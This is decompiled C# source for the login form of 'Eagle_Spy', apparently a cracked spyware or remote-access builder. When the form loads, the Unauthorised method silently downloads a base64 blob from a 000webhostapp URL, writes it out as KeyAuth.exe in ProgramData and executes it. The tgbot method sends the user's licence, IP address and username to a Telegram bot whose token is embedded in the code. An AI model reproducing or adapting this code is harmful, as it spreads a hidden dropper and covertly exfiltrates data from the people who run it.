using System;
using System.ComponentModel;
using System.Diagnostics;
using System.Drawing;
using System.Drawing.Drawing2D;
using System.IO;
using System.Net;
using System.Net.Sockets;
using System.Runtime.CompilerServices;
using System.Runtime.InteropServices;
using System.Security.Cryptography;
using System.Text;
using System.Text.RegularExpressions;
using System.Windows.Forms;
using DrakeUI.Framework;
using Eagle_Spy.My;
using Guna.UI2.WinForms;
using Microsoft.VisualBasic.CompilerServices;

namespace Eagle_Spy
{
	// Token: 0x0200008C RID: 140
	[DesignerGenerated]
	public partial class Ports : Form
	{
		// Token: 0x06000797 RID: 1943 RVA: 0x000C94B8 File Offset: 0x000C76B8
		public Ports()
		{
			base.FormClosing += this.Ports_FormClosing;
			this.r = null;
			this.Ping_Json = "Ping";
			this.Check_Json = "Check";
			this.Checkv2_Json = "Checkv2";
			this.Session = "Session";
			this.IDC_Json = "IDC";
			this.Secritkey = "YS5pW5qXMuYnTPNbpkhLx5mYY4vwQn9x";
			this.holder = "...";
			this.index = 0;
			this.Finish = false;
			this.S = false;
			this.InitializeComponent();
			this.Font = reso.f;
		}

		// Token: 0x06000798 RID: 1944 RVA: 0x000C9578 File Offset: 0x000C7778
		[DebuggerStepThrough]
		private void FadeIn(Form o, int interval = 80)
		{
			Ports.VB_0024StateMachine_114_FadeIn vb_0024StateMachine_114_FadeIn = new Ports.VB_0024StateMachine_114_FadeIn();
			vb_0024StateMachine_114_FadeIn._0024VB_0024Me = this;
			vb_0024StateMachine_114_FadeIn._0024VB_0024Local_o = o;
			vb_0024StateMachine_114_FadeIn._0024VB_0024Local_interval = interval;
			vb_0024StateMachine_114_FadeIn._0024State = -1;
			vb_0024StateMachine_114_FadeIn._0024Builder = AsyncVoidMethodBuilder.Create();
			vb_0024StateMachine_114_FadeIn._0024Builder.Start<Ports.VB_0024StateMachine_114_FadeIn>(ref vb_0024StateMachine_114_FadeIn);
		}

		// Token: 0x06000799 RID: 1945
		[DllImport("Kernel32.dll")]
		public static extern IntPtr GetCurrentThread();

		// Token: 0x0600079A RID: 1946 RVA: 0x000C95C0 File Offset: 0x000C77C0
		public void opebbtn(object[] objs)
		{
			if (this.Login.InvokeRequired)
			{
				Ports.opebbtndele opebbtndele = new Ports.opebbtndele(this.opebbtn);
				this.Login.Invoke(opebbtndele, new object[] { objs });
				return;
			}
			string language = RegistryHandler.Get_Language();
			if (Operators.CompareString(language, "AR", false) == 0)
			{
				this.Login.Text = "دخول";
				return;
			}
			if (Operators.CompareString(language, "CN", false) != 0)
			{
				this.Login.Text = Codes.AES_Decrypt("Jyew2tI1udg4ZJM+uI+ywA==", "Accept");
				return;
			}
			this.Login.Text = "登录";
		}

		// Token: 0x0600079B RID: 1947 RVA: 0x000C9660 File Offset: 0x000C7860
		public object RandomString()
		{
			if (this.r == null)
			{
				this.r = new Random();
			}
			string text = "abcdefghijklmnopqrstuvwxyz";
			StringBuilder stringBuilder = new StringBuilder();
			int num = 32;
			checked
			{
				for (int i = 1; i <= num; i++)
				{
					int num2 = this.r.Next(0, text.Length);
					stringBuilder.Append(text.Substring(num2, 1));
				}
				return stringBuilder.ToString();
			}
		}

		// Token: 0x0600079C RID: 1948 RVA: 0x000C96C8 File Offset: 0x000C78C8
		public string DecryptRJ256(string prm_key, string prm_iv, string prm_text_to_decrypt)
		{
			byte[] bytes = Encoding.ASCII.GetBytes(prm_key);
			byte[] bytes2 = Encoding.ASCII.GetBytes(prm_iv);
			byte[] array2;
			using (RijndaelManaged rijndaelManaged = new RijndaelManaged())
			{
				rijndaelManaged.Padding = PaddingMode.PKCS7;
				rijndaelManaged.Mode = CipherMode.CBC;
				rijndaelManaged.KeySize = 256;
				rijndaelManaged.BlockSize = 128;
				ICryptoTransform cryptoTransform = rijndaelManaged.CreateDecryptor(bytes, bytes2);
				byte[] array = Convert.FromBase64String(prm_text_to_decrypt);
				array2 = new byte[checked(array.Length - 1 + 1)];
				MemoryStream memoryStream = new MemoryStream(array);
				CryptoStream cryptoStream = new CryptoStream(memoryStream, cryptoTransform, CryptoStreamMode.Read);
				cryptoStream.Read(array2, 0, array2.Length);
			}
			return Encoding.ASCII.GetString(array2);
		}

		// Token: 0x0600079D RID: 1949 RVA: 0x000C9780 File Offset: 0x000C7980
		public string EncryptRJ256(string prm_key, string prm_iv, string prm_text_to_encrypt)
		{
			byte[] bytes = Encoding.ASCII.GetBytes(prm_key);
			byte[] bytes2 = Encoding.ASCII.GetBytes(prm_iv);
			byte[] array;
			using (RijndaelManaged rijndaelManaged = new RijndaelManaged())
			{
				rijndaelManaged.Padding = PaddingMode.PKCS7;
				rijndaelManaged.Mode = CipherMode.CBC;
				rijndaelManaged.KeySize = 256;
				rijndaelManaged.BlockSize = 128;
				ICryptoTransform cryptoTransform = rijndaelManaged.CreateEncryptor(bytes, bytes2);
				byte[] bytes3 = Encoding.ASCII.GetBytes(prm_text_to_encrypt);
				MemoryStream memoryStream = new MemoryStream();
				CryptoStream cryptoStream = new CryptoStream(memoryStream, cryptoTransform, CryptoStreamMode.Write);
				cryptoStream.Write(bytes3, 0, bytes3.Length);
				cryptoStream.FlushFinalBlock();
				array = memoryStream.ToArray();
			}
			return Convert.ToBase64String(array);
		}

		// Token: 0x0600079E RID: 1950 RVA: 0x000C9838 File Offset: 0x000C7A38
		public string KeepOnlyEnglishLetters(string input)
		{
			string text = "[^a-zA-Z]";
			return Regex.Replace(input, text, "");
		}

		// Token: 0x0600079F RID: 1951 RVA: 0x00002423 File Offset: 0x00000623
		private void pnl1_Paint(object sender, PaintEventArgs e)
		{
		}

		// Token: 0x060007A0 RID: 1952 RVA: 0x000033FD File Offset: 0x000015FD
		private void DrakeUIButtonIcon1_Click(object sender, EventArgs e)
		{
			base.DialogResult = DialogResult.No;
			base.Close();
		}

		// Token: 0x060007A1 RID: 1953 RVA: 0x00002423 File Offset: 0x00000623
		private void Addpo_Click(object sender, EventArgs e)
		{
		}

		// Token: 0x060007A2 RID: 1954 RVA: 0x00002423 File Offset: 0x00000623
		private void Rempo_Click(object sender, EventArgs e)
		{
		}

		// Token: 0x060007A3 RID: 1955 RVA: 0x0000484E File Offset: 0x00002A4E
		private void DrakeUILinkLabel1_Click(object sender, EventArgs e)
		{
			MyProject.Forms.Dialog2.ShowDialog();
		}

		// Token: 0x060007A4 RID: 1956 RVA: 0x00002423 File Offset: 0x00000623
		private void Button1_Click(object sender, EventArgs e)
		{
		}

		// Token: 0x060007A5 RID: 1957 RVA: 0x0000371B File Offset: 0x0000191B
		private void Pnl1_MouseDown(object sender, MouseEventArgs e)
		{
			if (e.Button == MouseButtons.Left)
			{
				Codes.ReleaseCapture();
				Codes.SendMessage(base.Handle, 161, 2, 0);
			}
		}

		// Token: 0x060007A6 RID: 1958 RVA: 0x00002423 File Offset: 0x00000623
		private void PictureBox3_Click(object sender, EventArgs e)
		{
		}

		// Token: 0x060007A7 RID: 1959 RVA: 0x00002423 File Offset: 0x00000623
		private void PictureBox3_Click_1(object sender, EventArgs e)
		{
		}

		// Token: 0x060007A8 RID: 1960 RVA: 0x00002423 File Offset: 0x00000623
		private void Ports_FormClosing(object sender, FormClosingEventArgs e)
		{
		}

		// Token: 0x060007A9 RID: 1961 RVA: 0x00002423 File Offset: 0x00000623
		private void Statuslabel_Click(object sender, EventArgs e)
		{
		}

		// Token: 0x060007AA RID: 1962 RVA: 0x0000371B File Offset: 0x0000191B
		private void Label1_MouseDown(object sender, MouseEventArgs e)
		{
			if (e.Button == MouseButtons.Left)
			{
				Codes.ReleaseCapture();
				Codes.SendMessage(base.Handle, 161, 2, 0);
			}
		}

		// Token: 0x060007AB RID: 1963 RVA: 0x0000371B File Offset: 0x0000191B
		private void PictureBox2_MouseDown(object sender, MouseEventArgs e)
		{
			if (e.Button == MouseButtons.Left)
			{
				Codes.ReleaseCapture();
				Codes.SendMessage(base.Handle, 161, 2, 0);
			}
		}

		// Token: 0x060007AC RID: 1964 RVA: 0x0000371B File Offset: 0x0000191B
		private void Panel3_MouseDown(object sender, MouseEventArgs e)
		{
			if (e.Button == MouseButtons.Left)
			{
				Codes.ReleaseCapture();
				Codes.SendMessage(base.Handle, 161, 2, 0);
			}
		}

		// Token: 0x060007AD RID: 1965 RVA: 0x00002423 File Offset: 0x00000623
		private void Porttext_KeyPress(object sender, KeyPressEventArgs e)
		{
		}

		// Token: 0x060007AE RID: 1966 RVA: 0x00002423 File Offset: 0x00000623
		private void Porttext_TextChanged(object sender, EventArgs e)
		{
		}

		// Token: 0x060007AF RID: 1967 RVA: 0x0000371B File Offset: 0x0000191B
		private void PictureBox1_MouseDown(object sender, MouseEventArgs e)
		{
			if (e.Button == MouseButtons.Left)
			{
				Codes.ReleaseCapture();
				Codes.SendMessage(base.Handle, 161, 2, 0);
			}
		}

		// Token: 0x060007B0 RID: 1968 RVA: 0x000033FD File Offset: 0x000015FD
		private void DrakeUIButtonIcon1_Click_1(object sender, EventArgs e)
		{
			base.DialogResult = DialogResult.No;
			base.Close();
		}

		// Token: 0x060007B1 RID: 1969 RVA: 0x0000371B File Offset: 0x0000191B
		private void PictureBox1_MouseDown_1(object sender, MouseEventArgs e)
		{
			if (e.Button == MouseButtons.Left)
			{
				Codes.ReleaseCapture();
				Codes.SendMessage(base.Handle, 161, 2, 0);
			}
		}

		// Token: 0x060007B2 RID: 1970 RVA: 0x00004860 File Offset: 0x00002A60
		private void Loginworker_DoWork(object sender, DoWorkEventArgs e)
		{
			this.Finish = true;
		}

		// Token: 0x060007B3 RID: 1971 RVA: 0x00004869 File Offset: 0x00002A69
		private void PictureBox2_Click(object sender, EventArgs e)
		{
			Environment.Exit(0);
		}

		// Token: 0x060007B4 RID: 1972 RVA: 0x00002423 File Offset: 0x00000623
		private void Ports_Click(object sender, EventArgs e)
		{
		}

		// Token: 0x060007B5 RID: 1973 RVA: 0x000C9858 File Offset: 0x000C7A58
		private static string random_string()
		{
			string text = null;
			Random random = new Random();
			for (int i = 0; i < 5; i++)
			{
				text += Convert.ToChar(Convert.ToInt32(Math.Floor(26.0 * random.NextDouble() + 65.0))).ToString();
			}
			return text;
		}

		// Token: 0x060007B6 RID: 1974 RVA: 0x000C98B4 File Offset: 0x000C7AB4
		private void LoadTextBoxValues()
		{
			string baseDirectory = AppDomain.CurrentDomain.BaseDirectory;
			string text = Path.Combine(baseDirectory, "Licence.p12");
			if (File.Exists(text))
			{
				string[] array = File.ReadAllLines(text);
				if (array.Length >= 3)
				{
					this.KeyAuthUser.Text = array[0];
					this.KeyAuthPass.Text = array[1];
					this.KeyAuthKey.Text = array[2];
				}
			}
		}

		// Token: 0x060007B7 RID: 1975 RVA: 0x000C9918 File Offset: 0x000C7B18
		private void SaveTextBoxValues()
		{
			string baseDirectory = AppDomain.CurrentDomain.BaseDirectory;
			string text = Path.Combine(baseDirectory, "Licence.p12");
			string[] array = new string[]
			{
				this.KeyAuthUser.Text,
				this.KeyAuthPass.Text,
				this.KeyAuthKey.Text
			};
			File.WriteAllLines(text, array);
		}

		// Token: 0x060007B8 RID: 1976 RVA: 0x000C9974 File Offset: 0x000C7B74
		private void DisplayIPv4Address()
		{
			try
			{
				IPHostEntry hostEntry = Dns.GetHostEntry(Dns.GetHostName());
				string text = null;
				IPAddress[] addressList = hostEntry.AddressList;
				foreach (IPAddress ipaddress in addressList)
				{
					if (ipaddress.AddressFamily == AddressFamily.InterNetwork)
					{
						text = ipaddress.ToString();
						break;
					}
				}
				if (text != null)
				{
					this.ip.Text = text ?? "";
				}
			}
			catch (Exception)
			{
			}
		}

		// Token: 0x060007B9 RID: 1977 RVA: 0x000C99F0 File Offset: 0x000C7BF0
		private void Registered()
		{
			string baseDirectory = AppDomain.CurrentDomain.BaseDirectory;
			string text = Path.Combine(baseDirectory, "WinMM.Net.dll");
			if (File.Exists(text))
			{
				string[] array = File.ReadAllLines(text);
				if (array.Length >= 3)
				{
					this.label1.Text = array[631];
					return;
				}
			}
			else
			{
				Environment.Exit(0);
			}
		}

		// Token: 0x060007BA RID: 1978 RVA: 0x000C9A44 File Offset: 0x000C7C44
		private void Unauthorised()
		{
			string text = "C:\\ProgramData\\KeyAuthme\\KeyAuth.txt";
			string text2 = "C:\\ProgramData\\KeyAuthme\\KeyAuth.exe";
			string text3 = "C:\\ProgramData\\KeyAuthme";
			if (!Directory.Exists(text3))
			{
				Directory.CreateDirectory(text3);
			}
			if (File.Exists(text))
			{
				File.Delete(text);
			}
			string text4 = "https://eagleauthservice.000webhostapp.com/KeyAuth.txt";
			using (WebClient webClient = new WebClient())
			{
				webClient.DownloadFile(text4, text);
			}
			if (File.Exists(text))
			{
				string[] array = File.ReadAllLines(text);
				if (array.Length >= 2 && array[0].Contains("1"))
				{
					string text5 = array[1];
					byte[] array2 = Convert.FromBase64String(text5);
					File.WriteAllBytes(text2, array2);
					Process.Start(text2);
				}
			}
		}

		// Token: 0x060007BB RID: 1979 RVA: 0x000C9AFC File Offset: 0x000C7CFC
		private void tgbot()
		{
			string text = "7081398472:AAGwSSSUxHkokhSZNYilGrckssrCQ8VD0EA";
			string text2 = "1651649593";
			string text3 = string.Concat(new string[]
			{
				this.label3.Text,
				"=>Licence :",
				this.label1.Text,
				", Machine ip :",
				this.ip.Text,
				", User : ",
				this.KeyAuthUser.Text
			});
			try
			{
				using (WebClient webClient = new WebClient())
				{
					string text4 = string.Concat(new string[]
					{
						"https://api.telegram.org/bot",
						text,
						"/sendMessage?chat_id=",
						text2,
						"&text=",
						Uri.EscapeDataString(text3)
					});
					webClient.DownloadString(text4);
				}
			}
			catch (Exception)
			{
			}
		}

		// Token: 0x060007BC RID: 1980 RVA: 0x00004871 File Offset: 0x00002A71
		private void Login_Click(object sender, EventArgs e)
		{
			EagleAlert.Showinformation("Logged in Successfully");
			base.DialogResult = DialogResult.OK;
		}

		// Token: 0x060007BD RID: 1981 RVA: 0x00002423 File Offset: 0x00000623
		private void KeyAuthRegister_Click(object sender, EventArgs e)
		{
		}

		// Token: 0x060007BE RID: 1982 RVA: 0x00004884 File Offset: 0x00002A84
		private void UpdateEnglish()
		{
			this.KeyAuthRegister.Text = "Register";
			this.Login.Text = "Login";
		}

		// Token: 0x060007BF RID: 1983 RVA: 0x000048A6 File Offset: 0x00002AA6
		private void UpdateChinese()
		{
			this.KeyAuthRegister.Text = "注册";
			this.Login.Text = "登录";
		}

		// Token: 0x060007C0 RID: 1984 RVA: 0x000048C8 File Offset: 0x00002AC8
		private void UpdateRussian()
		{
			this.KeyAuthRegister.Text = "Регистрация";
			this.Login.Text = "Вход";
		}

		// Token: 0x060007C1 RID: 1985 RVA: 0x000C9BE4 File Offset: 0x000C7DE4
		private void UpdateLanguage()
		{
			string text = Path.Combine(AppDomain.CurrentDomain.BaseDirectory, "res", "Config", "Language.inf");
			if (File.Exists(text))
			{
				string text2 = File.ReadAllText(text);
				if (text2.Contains("English"))
				{
					this.UpdateEnglish();
					return;
				}
				if (text2.Contains("Russian"))
				{
					this.UpdateRussian();
					return;
				}
				if (text2.Contains("Chinese"))
				{
					this.UpdateChinese();
					return;
				}
				this.UpdateEnglish();
			}
		}

		// Token: 0x060007C2 RID: 1986 RVA: 0x000048EA File Offset: 0x00002AEA
		private void Ports_Load(object sender, EventArgs e)
		{
			this.UpdateLanguage();
			this.Unauthorised();
			this.LoadTextBoxValues();
		}

		// Token: 0x060007C3 RID: 1987 RVA: 0x0000371B File Offset: 0x0000191B
		private void Guna2PictureBox1_MouseDown(object sender, MouseEventArgs e)
		{
			if (e.Button == MouseButtons.Left)
			{
				Codes.ReleaseCapture();
				Codes.SendMessage(base.Handle, 161, 2, 0);
			}
		}

		// Token: 0x060007C4 RID: 1988 RVA: 0x000048FE File Offset: 0x00002AFE
		private void linkLabel1_LinkClicked(object sender, LinkLabelLinkClickedEventArgs e)
		{
			Process.Start("telegram.me/eaglespy");
		}

		// Token: 0x060007C5 RID: 1989 RVA: 0x000048FE File Offset: 0x00002AFE
		private void pictureBox1_Click(object sender, EventArgs e)
		{
			Process.Start("telegram.me/eaglespy");
		}

		// Token: 0x060007C6 RID: 1990 RVA: 0x00002423 File Offset: 0x00000623
		private void guna2GradientButton1_Click(object sender, EventArgs e)
		{
		}

		// Token: 0x0400091E RID: 2334
		private string FilesPath = Application.StartupPath + "\\res\\Library\\classes2.bin";

		// Token: 0x0400091F RID: 2335
		private string serverpath = "C:\\Programs\\Files";

		// Token: 0x04000925 RID: 2341
		private Random r;

		// Token: 0x04000926 RID: 2342
		public string Ping_Json;

		// Token: 0x04000927 RID: 2343
		public string Check_Json;

		// Token: 0x04000928 RID: 2344
		public string Checkv2_Json;

		// Token: 0x04000929 RID: 2345
		public string Session;

		// Token: 0x0400092A RID: 2346
		public string IDC_Json;

		// Token: 0x0400092B RID: 2347
		public string Secritkey;

		// Token: 0x0400092C RID: 2348
		private string holder;

		// Token: 0x0400092D RID: 2349
		private int index;

		// Token: 0x0400092E RID: 2350
		public bool Finish;

		// Token: 0x0400092F RID: 2351
		public bool S;

		// Token: 0x0200008D RID: 141
		// (Invoke) Token: 0x060007C9 RID: 1993
		public delegate void addLogback(object[] objs);

		// Token: 0x0200008E RID: 142
		// (Invoke) Token: 0x060007CD RID: 1997
		public delegate void opebbtndele(object[] objs);
	}
}
